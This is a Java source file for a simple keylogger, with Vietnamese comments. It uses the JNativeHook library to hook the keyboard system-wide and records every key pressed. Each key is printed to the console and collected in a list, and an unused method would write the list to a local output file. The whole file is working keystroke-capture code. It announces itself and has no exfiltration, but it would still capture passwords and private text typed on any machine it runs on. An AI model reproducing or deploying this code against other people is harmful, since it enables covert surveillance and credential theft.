package services;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import java.awt.event.KeyEvent;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.Scanner;

public class KeyLogger implements NativeKeyListener {
    private static KeyLogger keyLogger;
    private ArrayList<String> logs = new ArrayList<>();
    private String logFilePath = "./output/keylog_output.txt"; // Đường dẫn tới tệp ghi log

    private void addLog(String log) {
        logs.add(log);
    }

    private void saveLogsToFile() {
        try (BufferedWriter writer = new BufferedWriter(new FileWriter(logFilePath))) {
            for (String log : logs) {
                writer.write(log);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void startKeyLogger() {
        try {
            if (keyLogger == null) {
                keyLogger = new KeyLogger();
                GlobalScreen.registerNativeHook();
                GlobalScreen.addNativeKeyListener(keyLogger);
                System.out.println("Keylogger started.");
            } else {
                System.out.println("Keylogger is already running.");
            }
        } catch (NativeHookException e) {
            e.printStackTrace();
        }
    }

    public static void stopKeyLogger() {
        try {
            if (keyLogger != null) {
                GlobalScreen.unregisterNativeHook();
                keyLogger = null;
                System.out.println("Keylogger stopped.");
            } else {
                System.out.println("Keylogger is not running.");
            }
        } catch (NativeHookException e) {
            e.printStackTrace();
        }
    }

    public void nativeKeyPressed(NativeKeyEvent e) {
        String keyText = NativeKeyEvent.getKeyText(e.getKeyCode()) + " ";
        addLog(keyText);
        System.out.println("Key Pressed: " + keyText);
    }

    public void nativeKeyReleased(NativeKeyEvent e) {
        // Xử lý sự kiện khi phím được nhả ra
    }

    public void nativeKeyTyped(NativeKeyEvent e) {
        // Xử lý sự kiện khi phím được gõ
    }

    public static void main(String[] args) {
        // Bắt đầu keylogger
        KeyLogger.startKeyLogger();

        // Chờ cho đến khi người dùng nhấn Enter để dừng keylogger
        System.out.println("Press Enter to stop the keylogger.");
        Scanner scanner = new Scanner(System.in);
        scanner.nextLine(); // Đợi người dùng nhấn Enter

        KeyLogger.stopKeyLogger();
        scanner.close();
    }
}






